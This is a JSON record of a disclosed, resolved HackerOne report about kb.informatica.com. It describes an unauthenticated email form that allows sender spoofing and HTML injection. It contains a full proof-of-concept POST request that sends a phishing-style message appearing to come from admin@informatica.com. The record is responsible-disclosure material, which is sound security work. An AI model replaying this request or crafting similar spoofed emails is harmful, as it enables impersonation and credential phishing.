@@ -1,0 +1,117 @@
+{
+  "id": 139402,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzk0MDI=",
+  "url": "https://hackerone.com/reports/139402",
+  "title": "[kb.informatica.com] Unauthenticated emails and HTML injection in email messages",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2016-05-17T18:06:34.804Z",
+  "submitted_at": "2016-05-17T18:06:34.804Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "strukt",
+    "url": "/strukt",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/038/303/42cd71a4698d80f88ab65e3117fd9fc401a57048_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 453,
+    "url": "https://hackerone.com/informatica",
+    "handle": "informatica",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Informatica",
+      "twitter_handle": "informatica",
+      "website": "https://www.informatica.com/",
+      "about": "Informatica Corporation is the world’s number one independent provider of data integration software."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2016-11-28T16:35:38.925Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-10-29T16:35:36.086Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello,\n\nThe endpoint at https://kb.informatica.com/_layouts/infa_kb/preview/EmailExtended.aspx?docid=anything is vulnerable to unauthenticated emails, which allows attackers to impersonate anyone and send emails on their behalf.\n\nAlso, the message body field is vulnerable to HTML injection, which allows the attacker to inject <a> and <img> tags in the message to make it more appealing to the victim.\n\nThe attacker is only able to use all the message parts (subject and body, and spoof the sender email) when the value of the GET parameter \"docid\" is invalid, following is a PoC request:\n\nPOST /_layouts/infa_kb/preview/EmailExtended.aspx?docid=test HTTP/1.1\nHost: kb.informatica.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.8.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://kb.informatica.com/_layouts/infa_kb/preview/EmailExtended.aspx?docid=test\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 456\n\n__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTEzODI5NjM1MmRkIAMIwf3AXuDHeZBC%2Bpk%2FVrqUtUo%3D&__VIEWSTATEGENERATOR=D7632FD9&__EVENTVALIDATION=%2FwEWDQKX6trHCgLs0bLrBgLs0fbZDALs0Yq1BQLs0e58AuzRgtgJAuzRxsYPAoznisYGApCjwqsNAs3nv%2BIOAsHFicAHAtPVqd4NAozmy%2BgBxyQ%2FpTxgPj3UtaL60YTEMzWLNM8%3D&TextBox1=████████&TextBox2=&TextBox3=&TextBox4=admin@informatica.com&TextBox5=A convincing subject&TextBox6=Hello, please visit <a href=http://www.example.com>Our login page</a> and enter your credentials to win a reward.&Button1=Submit\n\nThe above request will send an email to ████ from admin@informatica.com with a message that asks to open a link and enter the user's credentials, which will be really convincing for the user, especially if the attacker has already registered a domain name that looks like Informatica's legit one.\n\nI have attached a screenshot of the mail I received from the above request to make it more clear.\n\nRegards",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 94349,
+      "file_name": "Selection_011.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/094/349/6710155f4f6e35b31113f1ae13c920d2ed8a513b/Selection_011.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_011.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_011.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYNWCPB7L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T121117Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZonlQ6XZgqcJy52%2BgLeu7rc%2BcmnwL48Jd3jP8q5%2FnAIgBqR93Cql4TkH3OcEpzuPURjNMviKVAaN%2BZ5EJ93CKHMqsQUIcBADGgwwMTM2MTkyNzQ4NDkiDC6ruR9Bo4NPZ6hGziqOBTlv9ZKHmz6ju1OkdxDfdYMkEOLdYBFwxFeSW3uoBTkUPGqDZadsGRlOm%2FzVtXFfSNIYP7AeaBzFIeS8LcBh%2BgxgmY5hETW2LeYwB%2F3XW2H67p6e7bnzldnlj2tuACFxnKA6rcmcUQTXn4qVKPw%2FsgBonpbjVSLH1G3MhuwcdUrgeFjI7JHFzHMgd7%2BYjdjZMeFC5A7DM0sT8KjQAqMCvmyYUuytyZlFtZt%2BmkPDyj8xPC2BnGzGd8ViwG0oSBCmgyULo8%2BibDGvrMmOjHPDqqUa51uudsuIw3xXCU7yEl54SJO8XPwko%2FUDfNLlPnB%2BsrExqEFkzOUbRn8wytJZJbdlm4PKX7p1sguljWzLGzMthBAcUaMx563jGqM6UBzNW8J7ZvQGt%2B1a3uE51BbOuuys1pnhOCpDb5JVA%2F%2FnzxJBkW450qNxs7qEyti1abXcL80lTaRmG99RCoVXy4Z1np7gmDfekfXlXCBl86B94t2Ng9rjTnc7plMi%2BnjT5NpYRtvlD1UpwqSlpHw2LxzvZHpnEAjgW8aVgyKPoE6tQwMw2sgb02Lt0IOaTIVI9DmdZbb5FIIz5u0W7gGoxWgQ5yaRk5osuY5nK4GSs4uwAAb6e9hPfxePBU%2B3OK%2BLDM2L0ULVBqQLonfTFD4q0hygJNmtMZ93jUiC1uw5seAKU9RQaFXprCUTfTFtdiGuqhtRvHnqNI2%2BYtGwEaoPk45%2FBZHKWdUiA6zzx2Vh1ViwuP2bYU1TfleKuf4XSDTRnsL25sxpXHdWEdzp36j4m8m4N7y9V%2BDLGJL0W5laKN4XaBIRNCwRfNALochyxg%2FRqoYPvilO9klb%2Fo58doCSMcQFz%2B2dImB8vsUlC4TfkCpPPjC7payuBjqxAUz7jVGh5dF5HDYPCV1aK6vLNtHQn48iZT2lveCprzWjOASVNejwySv8S0Qz3%2BorxxSB4hGPZkqz36geF8d9lQ8aLh18bVe6qUL5yM5i2yxVkHovo80Uf9FwD0IrvwxhBv2vzB%2BEuch1dctBkoyLtJS470n%2BuD%2F%2BwCLVUXoH1ljlX3lPqEb2nvs0Eo4v6pGR4x8y4bHoxAxkfJRPNJ4ut4mAE9vidBtOStAITUN8HDLywA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=22d6d664f12802ebb663917dc27ebdf27b52d7a11ec232c86794f53f1456ce7c",
+      "file_size": 17141,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-11-28T16:35:36.166Z",
+  "allow_singular_disclosure_after": -227475341.18724597,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "its_afolic",
+    "pekafat",
+    "madrobot"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
